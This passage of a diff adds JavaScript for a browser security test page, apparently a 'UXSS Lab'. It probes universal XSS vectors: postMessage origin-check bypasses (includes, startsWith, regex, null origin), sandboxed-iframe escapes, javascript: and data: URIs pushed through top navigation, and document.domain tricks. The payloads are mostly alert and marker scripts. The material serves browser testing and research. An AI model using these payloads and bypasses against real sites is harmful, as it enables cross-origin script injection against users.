+      log(L, label + ' → accepted. document.domain now: "' + document.domain + '"', 'll-y');
+    } catch(e) {
+      log(L, label + ' → ' + e.name + ': ' + e.message.substring(0,70), 'll-g');
+    }
+  }
+  result('u12-result', 'Check log for document.domain behaviors', 'partial');
+}
+
+// ─── U13: postMessage * ───
+function testU13() {
+  const f = document.getElementById('pm1-victim');
+  const payload = document.getElementById('pm1-payload').value;
+  log('u13-log', 'Sending postMessage to victim iframe: ' + payload.substring(0,40), 'll-b');
+  f.contentWindow.postMessage(payload, '*');
+  log('u13-log', 'Message sent — check iframe for execution', 'll-y');
+}
+
+// ─── U14: targetOrigin bypass ───
+function testU14a() {
+  const L = 'u14-log';
+  log(L, 'Testing includes() origin check bypass...', 'll-b');
+  const f = document.createElement('iframe');
+  f.srcdoc = `<script>
+// Simulated vulnerable app that checks origin with includes()
+window.addEventListener('message', function(e) {
+  if (e.origin.includes('trusted.com')) {
+    document.body.innerHTML = '&lt;div style="color:red;padding:8px"&gt;BYPASSED! Payload: ' + e.data + '&lt;/div&gt;';
+    parent._u14 = 'BYPASSED';
+  } else {
+    document.body.innerHTML = '&lt;div style="color:#56d364;padding:8px"&gt;BLOCKED: ' + e.origin + '&lt;/div&gt;';
+    parent._u14 = 'BLOCKED';
+  }
+});
+document.body.innerHTML = '&lt;div style="color:#8b949e;padding:8px"&gt;Waiting...&lt;/div&gt;';
+<\/script>`;
+  f.style.cssText = 'border:1px solid var(--border);border-radius:4px;width:100%;height:50px;margin-top:6px;background:var(--bg3)';
+  document.getElementById('sec-pm2').querySelector('.card').appendChild(f);
+  setTimeout(() => {
+    // Our origin doesn't include "trusted.com" — simulating attack from current origin
+    f.contentWindow.postMessage('<img src=x onerror=alert("XSS")>', '*');
+    setTimeout(() => {
+      log(L, 'Result: ' + (window._u14 || 'no result'), window._u14 === 'BYPASSED' ? 'll-r' : 'll-g');
+      if (window._u14 === 'BYPASSED') {
+        result('u14-result', '⚡ includes() check bypassed! Origin not validated properly.', 'bypass');
+      } else {
+        result('u14-result', 'BLOCKED by origin check', 'blocked');
+      }
+      delete window._u14;
+    }, 300);
+  }, 400);
+}
+
+function testU14b() {
+  const L = 'u14-log';
+  log(L, 'Testing null origin (sandboxed iframe postMessage)...', 'll-b');
+  const victim = document.createElement('iframe');
+  victim.srcdoc = `<script>
+window.addEventListener('message', function(e) {
+  const safe = e.origin === 'https://trusted.com';
+  parent._u14b = {origin: e.origin, safe, data: e.data};
+});
+<\/script>`;
+  const attacker = document.createElement('iframe');
+  attacker.setAttribute('sandbox', 'allow-scripts');
+  attacker.style.cssText = 'width:1px;height:1px;opacity:0';
+  document.body.appendChild(victim);
+  document.body.appendChild(attacker);
+  setTimeout(() => {
+    attacker.srcdoc = `<script>
+// From sandboxed iframe, origin = "null"
+parent.frames[0].postMessage('PAYLOAD_FROM_NULL_ORIGIN','*');
+<\/script>`;
+    setTimeout(() => {
+      const r = window._u14b;
+      if (r) {
+        log(L, 'Message received. origin="' + r.origin + '" data="' + r.data + '"', r.origin === 'null' ? 'll-y' : 'll-d');
+        log(L, 'safe (checks against trusted.com): ' + r.safe, 'll-g');
+        log(L, '→ If app does: if(e.origin === "null") skip_check → BYPASS!', 'll-r');
+        result('u14-result', 'null origin received from sandboxed iframe — apps that allow "null" are vulnerable', 'partial');
+      }
+      delete window._u14b;
+      victim.remove(); attacker.remove();
+    }, 400);
+  }, 400);
+}
+
+function testU14c() {
+  const L = 'u14-log';
+  log(L, 'Regex bypass demo...', 'll-b');
+  const testOrigins = [
+    location.origin,
+    'https://trusted.com',
+    'https://trusted.com.evil.com',
+    'https://not-trusted.com',
+    'null'
+  ];
+  const weakChecks = [
+    ['includes', o => o.includes('trusted.com')],
+    ['startsWith', o => o.startsWith('https://trusted')],
+    ['regex /trusted\\.com/', o => /trusted\.com/.test(o)],
+  ];
+  for (const [name, fn] of weakChecks) {
+    for (const origin of testOrigins) {
+      try {
+        const pass = fn(origin);
+        if (pass && origin !== 'https://trusted.com') {
+          log(L, '⚡ ' + name + ' BYPASSED by: "' + origin + '"', 'll-r');
+        }
+      } catch(e) {}
+    }
+  }
+  log(L, 'Bypass analysis complete — check red lines above', 'll-b');
+  result('u14-result', '⚠ Check which origins bypass weak checks — red = bypass', 'partial');
+}
+
+// ─── U15: Service Worker ───
+async function testU15a() {
+  const L = 'u15-log';
+  log(L, 'Checking Service Worker support...', 'll-b');
+  if (!('serviceWorker' in navigator)) {
+    log(L, '✗ Service Worker not supported', 'll-r');
+    result('u15-result', '✗ SW not supported in this browser/context', 'blocked');
+    return;
+  }
+  if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+    log(L, '✗ SW requires HTTPS or localhost', 'll-r');
+    result('u15-result', '✗ Need HTTPS — serve this file via https:// or localhost', 'blocked');
+    return;
+  }
+  log(L, '✓ SW available. Checking registrations...', 'll-g');
+  const regs = await navigator.serviceWorker.getRegistrations();
+  log(L, 'Active SW registrations: ' + regs.length, 'll-y');
+  for (const r of regs) {
+    log(L, '  scope: ' + r.scope + ' state: ' + (r.active ? r.active.state : 'no active worker'), 'll-d');
+  }
+  setStatus('u15', regs.length > 0 ? 'has SW' : 'no SW', 'warn');
+  result('u15-result', 'SW available — scope interception test needs external file (sw.js)', 'partial');
+}
+
+async function testU15b() {
+  const L = 'u15-log';
+  log(L, 'SW Scope check — can attacker.com SW intercept victim.com navigation?', 'll-b');
+  log(L, 'Answer: NO. SW scope is ALWAYS within the origin that registered it.', 'll-g');
+  log(L, 'A SW at attacker.com/sw.js with scope "/" only controls attacker.com/ requests.', 'll-g');
+  log(L, 'Bug to look for: SW scope validation errors (e.g. path traversal in scope URL)', 'll-y');
+  log(L, 'Historical: CVE-2019-5858 (Safari) — SW from sub.evil.com could intercept parent evil.com', 'll-b');
+  result('u15-result', 'SW scope attacks require bug in browser SW scope validation — test scope path traversal', 'partial');
+}
+
+// ─── U16: sandbox ───
+function testU16a() {
+  const L = 'u16-log';
+  log(L, 'Testing: sandboxed iframe → parent.location access...', 'll-b');
+  window._u16 = null;
+  const f = document.createElement('iframe');
+  f.setAttribute('sandbox', 'allow-scripts allow-same-origin');
+  f.srcdoc = `<script>
+try {
+  parent.location.href = location.href;
+  parent._u16 = 'PARENT_NAV_SUCCESS';
+} catch(e) {
+  parent._u16 = 'blocked:' + e.name;
+}
+<\/script>`;
+  document.body.appendChild(f);
+  setTimeout(() => {
+    log(L, 'parent.location access: ' + (window._u16 || 'no result'), window._u16 && window._u16.startsWith('blocked') ? 'll-g' : 'll-r');
+    result('u16-result', 'sandbox+same-origin parent.location: ' + (window._u16 || 'no result'), window._u16 && window._u16.startsWith('blocked') ? 'blocked' : 'partial');
+    delete window._u16; f.remove();
+  }, 400);
+}
+
+function testU16b() {
+  const L = 'u16-log';
+  log(L, 'Testing: alert() origin display from sandboxed iframe...', 'll-b');
+  log(L, 'In sandbox without allow-same-origin, origin = null/opaque', 'll-y');
+  log(L, 'Question: does alert/confirm dialog show "null" or the page origin?', 'll-y');
+  const f = document.createElement('iframe');
+  f.setAttribute('sandbox', 'allow-scripts allow-modals');
+  f.srcdoc = `<script>
+setTimeout(() => alert('sandbox alert: domain=' + document.domain + ' origin=' + location.origin), 100);
+<\/script>`;
+  document.body.appendChild(f);
+  log(L, 'Alert from sandboxed iframe triggered — check title bar origin in dialog!', 'll-r');
+  setTimeout(() => f.remove(), 3000);
+  result('u16-result', '⚠ Alert shown — what origin label is displayed in the dialog?', 'partial');
+}
+
+function testU16c() {
+  const L = 'u16-log';
+  log(L, 'Testing: sandbox allow-forms — form submit to parent context?', 'll-b');
+  const f = document.createElement('iframe');
+  f.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin');
+  f.srcdoc = `<form method="GET" action="${location.href}">
+<input name="uxss" value="from_sandbox">
+<button type="submit" id="s">Submit</button></form>
+<script>document.getElementById('s').click()<\/script>`;
+  f.style.cssText = 'width:1px;height:1px;opacity:0';
+  document.body.appendChild(f);
+  log(L, 'Form submit from sandboxed iframe triggered...', 'll-y');
+  log(L, 'Check URL bar — did "uxss=from_sandbox" appear in URL?', 'll-b');
+  setTimeout(() => f.remove(), 1000);
+  result('u16-result', '⚠ Form submitted — did page navigate? SOP maintained?', 'partial');
+}
+
+// ─── U17: allow-top-navigation ───
+function testU17a() {
+  const L = 'u17-log';
+  log(L, 'Testing: sandbox allow-top-navigation + javascript: URI...', 'll-b');
+  window._u17 = null;
+  const f = document.createElement('iframe');
+  f.setAttribute('sandbox', 'allow-scripts allow-top-navigation');
+  f.srcdoc = `<script>
+try {
+  top.location = "javascript:void(parent._u17='UXSS_TOP')";
+  parent._u17 = 'nav_accepted_no_exception';
+} catch(e) {
+  parent._u17 = 'blocked:' + e.name;
+}
+<\/script>`;
+  document.body.appendChild(f);
+  setTimeout(() => {
+    log(L, 'top.location = js: result: ' + (window._u17 || 'no result'), window._u17 && window._u17.startsWith('blocked') ? 'll-g' : 'll-r');
+    if (window._u17 === 'UXSS_TOP') {
+      result('u17-result', '⚡ UXSS — sandbox allow-top-navigation allows javascript: URI in top!', 'bypass');
+      setStatus('u17', 'UXSS!', 'err');
+    } else {
+      result('u17-result', 'sandbox+allow-top-navigation result: ' + (window._u17 || 'no result'), 'blocked');
+    }
+    delete window._u17; f.remove();
+  }, 500);
+}
+
+function testU17b() {
+  const L = 'u17-log';
+  log(L, 'Testing: sandbox allow-top-navigation + data: URI...', 'll-b');
+  window._u17b = null;
+  const f = document.createElement('iframe');
+  f.setAttribute('sandbox', 'allow-scripts allow-top-navigation');
+  const payload = 'data:text/html,<script>opener&&(opener._u17b="data_uxss");alert(document.domain)<\/script>';
+  f.srcdoc = `<script>
+try {
+  top.location = '${payload}';
+  parent._u17b = 'nav_accepted';
+} catch(e) {
+  parent._u17b = 'blocked:'+e.name;
+}
+<\/script>`;
+  document.body.appendChild(f);
+  setTimeout(() => {
+    log(L, 'top.location = data: result: ' + (window._u17b || 'no result'), window._u17b && window._u17b.startsWith('blocked') ? 'll-g' : 'll-r');
+    result('u17-result', 'data: URI via top-nav: ' + (window._u17b || 'no result'), window._u17b && window._u17b.startsWith('blocked') ? 'blocked' : 'partial');
+    delete window._u17b; f.remove();
+  }, 500);
+}
+
+// ─── ENV ───
+function runEnvCheck() {
+  const L = 'env-log';
+  log(L, 'Origin: ' + location.origin, 'll-b');
+  log(L, 'Protocol: ' + location.protocol, location.protocol === 'https:' ? 'll-g' : 'll-y');
+  log(L, 'UA: ' + navigator.userAgent.substring(0,120), 'll-d');
+  log(L, 'ServiceWorker: ' + ('serviceWorker' in navigator), 'll-y');
+  log(L, 'Sandbox from opener: ' + (window.opener ? 'has opener' : 'no opener'), 'll-d');
+  log(L, 'document.domain: "' + document.domain + '"', 'll-y');
+  log(L, 'window.name: "' + (window.name || '(empty)') + '"', 'll-y');
+  log(L, 'Cross-origin isolation: ' + (crossOriginIsolated ? 'YES (COEP+COOP active)' : 'NO'), crossOriginIsolated ? 'll-g' : 'll-y');
+  // Chrome version
+  const m = navigator.userAgent.match(/Chrome\/(\d+)/);
+  if (m) log(L, 'Chrome version: ' + m[1] + (parseInt(m[1]) >= 126 ? ' (modern — most vectors patched)' : ' (older — may have bugs)'), 'll-b');
+}
+
+// ─── Run All ───
+function runAll() {
+  const L = 'overview-log';
+  log(L, '=== Running all quick checks ===', 'll-b');
+  // Quick version of each test
+  ['u1','u2','u3','u4','u5','u6','u7','u8','u9','u10','u11','u12','u13','u14','u15','u16','u17'].forEach(id => setStatus(id, 'running...', 'warn'));
+  // Run U1 check quickly
+  setTimeout(() => {
+    const f = document.createElement('iframe');
+    window._qaMarker = 'QA_' + Date.now();
+    f.src = "javascript:void(parent._qaMarker = 'UXSS_U1_' + document.domain)";
+    f.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0';
+    document.body.appendChild(f);
+    setTimeout(() => {
+      if (window._qaMarker && window._qaMarker.startsWith('UXSS_U1_')) {
+        log(L, '⚡ U1 UXSS!', 'll-r'); setStatus('u1', 'UXSS!', 'err');
+      } else {
+        log(L, '✓ U1 blocked', 'll-g'); setStatus('u1', 'BLOCKED', 'ok');
+      }
+      delete window._qaMarker; f.remove();
+    }, 300);
+  }, 100);
+  // document.domain tests
+  setTimeout(() => {
+    try { document.domain = 'com'; setStatus('u11', 'ACCEPTS TLD?!', 'err'); }
+    catch(e) { setStatus('u11', 'BLOCKED', 'ok'); }
+    try { document.domain = ''; setStatus('u12', 'ACCEPTS ""', 'warn'); }
+    catch(e) { setStatus('u12', 'BLOCKED', 'ok'); }
+  }, 200);
+  // blob test
+  setTimeout(() => {
+    const blob = new Blob(['<script>parent._qaBlob=document.domain<\/script>'],{type:'text/html'});
+    const url = URL.createObjectURL(blob);
+    const bf = document.createElement('iframe');
+    bf.src = url;
+    bf.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0';
+    document.body.appendChild(bf);
+    setTimeout(() => {
+      setStatus('u6', window._qaBlob ? 'same-origin' : 'checked', 'warn');
+      delete window._qaBlob; URL.revokeObjectURL(url); bf.remove();
+    }, 400);
+  }, 400);
+  // sandbox allow-top-nav
+  setTimeout(() => {
+    window._qaTop = null;
+    const sf = document.createElement('iframe');
+    sf.setAttribute('sandbox','allow-scripts allow-top-navigation');
+    sf.srcdoc = `<script>try{top.location="javascript:void(parent._qaTop='UXSS')";parent._qaTop=parent._qaTop||'nav_no_err'}catch(e){parent._qaTop='blocked'}<\/script>`;
+    sf.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0';
+    document.body.appendChild(sf);
+    setTimeout(() => {
+      setStatus('u17', window._qaTop === 'UXSS' ? 'UXSS!' : 'BLOCKED', window._qaTop === 'UXSS' ? 'err' : 'ok');
+      log(L, 'U17 sandbox top-nav: ' + (window._qaTop || 'blocked'), window._qaTop === 'UXSS' ? 'll-r' : 'll-g');
+      delete window._qaTop; sf.remove();
+      log(L, '=== Quick scan complete — check sidebar for details ===', 'll-b');
+      ['u2','u3','u4','u5','u7','u8','u9','u10','u13','u14','u15','u16'].forEach(id => setStatus(id, 'manual', 'warn'));
+    }, 500);
+  }, 600);
+}
+
+// ─── notes export ───
+function exportNotes() {
+  const notes = document.getElementById('lab-notes').value;
+  const b = new Blob(['UXSS Lab Notes\n' + new Date().toISOString() + '\n' +
+    'UA: ' + navigator.userAgent + '\n\n' + notes], {type:'text/plain'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(b);
+  a.download = 'uxss-notes-' + Date.now() + '.txt';
+  a.click();
+}
+
+// init
+document.addEventListener('DOMContentLoaded', () => {
+  runEnvCheck();
+});
+</script>
+</body>
+</html>
